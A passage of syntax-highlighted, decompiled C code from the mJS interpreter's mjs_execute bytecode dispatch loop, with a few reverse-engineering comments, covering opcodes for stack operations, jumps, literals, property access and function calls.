</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjsa, a);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjsa, b);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        n_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_0);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> llen_0 <span style="color:#f92672">+</span> n_0;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        n_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_2);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> llen_2;
</span></span><span style="display:flex;"><span>        v60 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v11 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_truthy</span>(v60, v11) )
</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">+=</span> n_2;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">7u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        n_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_1);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> llen_1;
</span></span><span style="display:flex;"><span>        v61 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_truthy</span>(v61, v10) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_push</span>(mjsa, <span style="color:#ae81ff">0xFFF3000000000000LL</span>);
</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">+=</span> n_1;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">8u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        n_3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_3);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> llen_3;
</span></span><span style="display:flex;"><span>        v59 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v12 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_truthy</span>(v59, v12) )
</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">+=</span> n_3;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">9u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack);
</span></span><span style="display:flex;"><span>        v58 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v13 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_find_scope</span>(mjsa, key);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v58, v13);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xAu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_stack_size</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes) )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">__assert_fail</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mjs_stack_size(&amp;mjs-&gt;scopes) &gt; 0&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;src/mjs_exec.c&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x2D5u</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)&#34;</span>);
</span></span><span style="display:flex;"><span>        v56 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v15 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v56, v15);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xBu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        length <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_4);
</span></span><span style="display:flex;"><span>        v55 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v16 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_string</span>(mjsa, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> llen_4], length, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v55, v16);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> length <span style="color:#f92672">+</span> llen_4;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xCu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v65 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjsa, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v65, v6);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xDu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v66 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_boolean</span>(mjsa, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v66, v5);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xEu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        n_5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_5);
</span></span><span style="display:flex;"><span>        v54 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v17 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(mjsa, (<span style="color:#66d9ef">double</span>)(<span style="color:#66d9ef">int</span>)n_5);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v54, v17);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> llen_5;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xFu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        n_6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_6);
</span></span><span style="display:flex;"><span>        v53 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v52 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v18 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtod</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> llen_6], <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>        v19 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_number</span>(v52, v18);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v53, v19);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> n_6 <span style="color:#f92672">+</span> llen_6;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x10u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v68 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_null</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v68, v3);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x11u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v67 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_undefined</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v67, v4);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x12u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v64 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_object</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v64, v7);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x13u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v63 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_array</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v63, v8);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x14u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen);
</span></span><span style="display:flex;"><span>        v62 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v9 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_function</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx <span style="color:#f92672">-</span> n);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v62, v9);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> llen;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x15u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjsa, mjsa<span style="color:#f92672">-&gt;</span>vals.this_obj);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x16u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        obj_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);                  <span style="color:#75715e">// SCOPE 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        key_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);                  <span style="color:#75715e">// ENCODED STR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        val_0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">getprop_builtin</span>(mjsa, obj_0, key_1, <span style="color:#f92672">&amp;</span>val_0) )<span style="color:#75715e">// NOT PROPERTY BUILTIN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_object</span>(obj_0) )
</span></span><span style="display:flex;"><span>            val_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_v_proto</span>(mjsa, obj_0, key_1);<span style="color:#75715e">// OBJECT -&gt; GET PROTO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mjs_prepend_errorf</span>(mjsa, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;type error&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjsa, val_0);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( prev_opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">9</span> )
</span></span><span style="display:flex;"><span>          mjsa<span style="color:#f92672">-&gt;</span>vals.last_getprop_obj <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>          mjsa<span style="color:#f92672">-&gt;</span>vals.last_getprop_obj <span style="color:#f92672">=</span> obj_0;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x17u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        obj <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        key_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_get_own_property_v</span>(mjsa, obj, key_0) )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_v</span>(mjsa, obj, key_0, <span style="color:#ae81ff">0xFFF3000000000000LL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x18u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        op <span style="color:#f92672">=</span> code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exec_expr</span>(mjsa, op);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>i;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x19u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        val <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        arr <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_array_push</span>(mjsa, arr, val) )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;append to non-array&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1Au</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        v82 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen1);
</span></span><span style="display:flex;"><span>        n_7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[llen1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> i], <span style="color:#f92672">&amp;</span>llen2);
</span></span><span style="display:flex;"><span>        key_3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_string</span>(mjsa, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> llen1 <span style="color:#f92672">+</span> llen2], n_7, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        obj_2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes);
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_arg</span>(mjsa, v82);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_v</span>(mjsa, obj_2, key_3, v);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> n_7 <span style="color:#f92672">+</span> llen2 <span style="color:#f92672">+</span> llen1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1Bu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes;
</span></span><span style="display:flex;"><span>        v14 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_object</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push_mjs_val</span>(m, v14);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1Cu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( mjsa<span style="color:#f92672">-&gt;</span>scopes.len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_pop_val</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>scopes);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_INTERNAL_ERROR, <span style="color:#e6db74">&#34;scopes underflow&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1Du</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        retval_stack_idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>arg_stack);
</span></span><span style="display:flex;"><span>        func_pos <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(mjsa, retval_stack_idx) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        func <span style="color:#f92672">=</span> <span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack, func_pos);    <span style="color:#75715e">// get pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mjs_pop_val</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>arg_stack);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_function</span>(<span style="color:#f92672">*</span>func) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_push_frame</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx, retval_stack_idx);
</span></span><span style="display:flex;"><span>          off_call <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_func_addr</span>(<span style="color:#f92672">*</span>func) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          bp_0 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mjs_bcode_part_get_by_offset</span>(mjsa, off_call);
</span></span><span style="display:flex;"><span>          code <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)bp_0.data.p;
</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">=</span> off_call <span style="color:#f92672">-</span> bp_0.start_idx;
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>func <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_ffi_sig</span>(<span style="color:#f92672">*</span>func) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_push_frame</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx, retval_stack_idx);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_ffi_call2</span>(mjsa);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_restore_frame</span>(mjsa);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_foreign</span>(<span style="color:#f92672">*</span>func) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_push_frame</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx, retval_stack_idx);
</span></span><span style="display:flex;"><span>          ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(mjs <span style="color:#f92672">*</span>))<span style="color:#a6e22e">mjs_get_ptr</span>(mjsa, <span style="color:#f92672">*</span>func);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">ptr</span>(mjsa);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_restore_frame</span>(mjsa);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;calling non-callable&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1Eu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        off_ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">call_stack_restore_frame</span>(mjsa);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( off_ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7FFFFFFF</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> clean;
</span></span><span style="display:flex;"><span>        bp_0 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mjs_bcode_part_get_by_offset</span>(mjsa, off_ret);
</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)bp_0.data.p;
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> off_ret <span style="color:#f92672">-</span> bp_0.start_idx;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_exec.c&#34;</span>, <span style="color:#ae81ff">781</span>) )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;RETURNING TO %d&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(off_ret <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>LABEL_93:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( mjsa<span style="color:#f92672">-&gt;</span>error <span style="color:#f92672">==</span> MJS_OK )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">++</span>i;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>        }
